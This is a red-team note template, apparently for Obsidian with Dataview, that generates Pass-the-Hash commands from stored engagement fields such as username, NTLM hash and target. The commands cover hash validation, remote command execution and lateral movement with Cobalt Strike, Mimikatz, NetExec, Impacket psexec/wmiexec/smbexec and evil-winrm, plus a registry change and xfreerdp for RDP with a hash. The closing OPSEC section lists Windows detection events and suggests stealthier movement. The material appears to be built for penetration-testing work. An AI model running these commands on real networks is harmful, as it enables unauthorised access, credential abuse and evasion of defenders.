---
# Attack-specific fields
pth_username:
pth_ntlm_hash:
pth_target_ip:
pth_target_fqdn:
pth_service: smb
notes:
---

# Pass the Hash (PtH)

> [!abstract] Attack Summary
> **Pass the Hash** uses an NTLM hash directly to authenticate without knowing the plaintext password. Works against SMB, WMI, WinRM, RDP, and other NTLM-supporting services. Requires local admin rights on the target (or DA-level access for DC attacks).

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["NTLM Hash",b?.ntlm_hash ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");

const services = ["smb","winrm","wmi","rdp","mssql"];
const svcOptions = services.map(s => `option(${s})`).join(',');

dv.table(["Field", "Value"], [
  ["Username",      `\`INPUT[text(defaultValue("${p.pth_username || b?.username || ''}")):pth_username]\``],
  ["NTLM Hash",     `\`INPUT[text(defaultValue("${p.pth_ntlm_hash || b?.ntlm_hash || ''}")):pth_ntlm_hash]\``],
  ["Target IP",     `\`INPUT[text(defaultValue("${p.pth_target_ip || b?.target_ip || ''}")):pth_target_ip]\``],
  ["Target FQDN",   `\`INPUT[text(defaultValue("${p.pth_target_fqdn || b?.target_fqdn || ''}")):pth_target_fqdn]\``],
  ["Service",       `\`INPUT[inlineSelect(defaultValue(${p.pth_service ?? 'smb'}),${svcOptions}):pth_service]\``],
]);
```

---

## Step 1 — Verify the Hash

**Windows — Cobalt Strike make_token**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const shortDom = domain.split('.')[0].toUpperCase();
const username = p?.pth_username || b?.username || "USER";
const ntlm     = p?.pth_ntlm_hash || b?.ntlm_hash || "NTLM_HASH";
const targetIp = p?.pth_target_ip || b?.target_ip || "TARGET_IP";
dv.paragraph("```bash\n# Cobalt Strike pth command\npth " + shortDom + "\\" + username + " " + ntlm + "\n\n# Or with Mimikatz\nsekurlsa::pth /user:" + username + " /domain:" + shortDom + " /ntlm:" + ntlm + " /run:powershell.exe\n```");
```

**Linux — NetExec (SMB)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const username = p?.pth_username || b?.username || "USER";
const ntlm     = p?.pth_ntlm_hash || b?.ntlm_hash || "NTLM_HASH";
const targetIp = p?.pth_target_ip || b?.target_ip || "TARGET_IP";
dv.paragraph("```bash\n# Validate credentials\nnxc smb " + targetIp + " -u '" + username + "' -H '" + ntlm + "' -d " + domain + "\n\n# Execute command\nnxc smb " + targetIp + " -u '" + username + "' -H '" + ntlm + "' -d " + domain + " -x 'whoami'\n\n# Get shell\nnxc smb " + targetIp + " -u '" + username + "' -H '" + ntlm + "' -d " + domain + " --exec-method smbexec -x 'whoami'\n```");
```

---

## Step 2 — Lateral Movement via PtH

**Linux — Impacket psexec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain ?? "DOMAIN";
const username   = p?.pth_username || b?.username || "USER";
const ntlm       = p?.pth_ntlm_hash || b?.ntlm_hash || "NTLM_HASH";
const targetFqdn = p?.pth_target_fqdn || b?.target_fqdn || "TARGET_FQDN";
const targetIp   = p?.pth_target_ip || b?.target_ip || "TARGET_IP";
dv.paragraph("```bash\n# PSExec\nimpacket-psexec " + domain + "/" + username + "@" + targetFqdn + " -hashes :'" + ntlm + "'\n\n# WMIExec\nimpacket-wmiexec " + domain + "/" + username + "@" + targetIp + " -hashes :'" + ntlm + "'\n\n# SMBExec\nimpacket-smbexec " + domain + "/" + username + "@" + targetIp + " -hashes :'" + ntlm + "'\n\n# Evil-WinRM (WinRM)\nevil-winrm -i " + targetIp + " -u " + username + " -H " + ntlm + "\n```");
```

**Windows — Cobalt Strike jump**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const targetFqdn = p?.pth_target_fqdn || "TARGET_FQDN";
dv.paragraph("```bash\n# After running pth to impersonate:\njump psexec64 " + targetFqdn + " LISTENER\njump winrm64 " + targetFqdn + " LISTENER\njump wmi64 " + targetFqdn + " LISTENER\n```");
```

---

## Step 3 — RDP via PtH (Restricted Admin Mode)

> [!info] RDP PtH requires **Restricted Admin Mode** to be enabled on the target (common on Windows 2012 R2+).

**Windows — Enable Restricted Admin then RDP**
```dataviewjs
const p = dv.current();
const targetIp = p?.pth_target_ip || "TARGET_IP";
dv.paragraph("```bash\n# Enable Restricted Admin (if needed)\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0x0 /f\n\n# RDP with hash via xfreerdp\nxfreerdp /v:" + targetIp + " /u:administrator /pth:NTLM_HASH /cert-ignore\n\n# Or via Mimikatz\nsekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:NTLM_HASH /run:mstsc.exe\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - NTLM authentication to SMB/WMI generates **Event 4624** (logon type 3) with NTLM auth package.
> - **Event 4648** — explicit credential logon.
> - PsExec leaves artifacts: service creation (4697), file write to ADMIN$.
> - High volume of lateral movement from one source is anomalous.
> - Consider using Kerberos (Pass the Ticket) for stealthier movement.

---

## Notes & Results

`INPUT[textarea:notes]`
